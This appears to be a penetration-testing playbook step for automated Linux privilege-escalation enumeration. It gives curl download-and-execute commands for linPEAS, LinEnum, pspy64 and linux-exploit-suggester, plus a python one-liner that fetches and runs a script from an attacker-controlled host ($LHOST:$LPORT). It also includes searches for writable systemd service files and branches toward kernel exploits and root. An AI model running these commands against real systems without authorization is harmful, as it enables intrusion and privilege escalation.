# Privilege Escalation — Automated Probe

## Purpose
Run automated enumeration tools (linPEAS, LinEnum, pspy64, linux-exploit-suggester) to surface privilege escalation vectors missed during manual discovery.

## Required Variables
- \$LHOST: attacker IP for reverse shells
- \$LPORT: attacker listener port

## Commands

```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas_output.txt

curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh && chmod +x /tmp/LinEnum.sh && /tmp/LinEnum.sh -t -r /tmp/linenum_report

curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64 && timeout 60 /tmp/pspy64 -pf -i 1000 | tee /tmp/pspy_output.txt

curl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o /tmp/les.sh && bash /tmp/les.sh | tee /tmp/les_output.txt
```

If target has no outbound internet, upload tools via attacker-controlled HTTP server:

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://$LHOST:$LPORT/linpeas.sh', '/tmp/linpeas.sh')" && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

If linPEAS or LinEnum report highlights writable service files or configs, enumerate further:

```bash
find /etc/systemd/system /lib/systemd/system -writable -type f 2>/dev/null | tee /tmp/discovery_writable_services.txt

grep -r "ExecStart\|ExecStop" /etc/systemd/system/ 2>/dev/null | grep -v '^#' | tee /tmp/discovery_service_exec.txt
```

## Detection Signals
- linPEAS output highlighting 99% probability vectors (text highlighted in RED/YELLOW)
- pspy64 reveals processes running as root triggered by cron or user actions
- linux-exploit-suggester lists kernel with CVE-ID and exploit-db reference
- LinEnum flags writable /etc/passwd or writable directories in $PATH
- Any service file writable by current user with ExecStart containing writable binary

## Next
├── If SUID/sudo vectors confirmed → go to 03-verify
├── If kernel exploit matched to uname -r → go to 04-impact-escalation
├── If Docker/K8s escape possible → go to 04-impact-escalation
├── If root obtained directly → go to 05-evidence-collection
├── If no findings → go to 06-false-positive-filter to validate prior results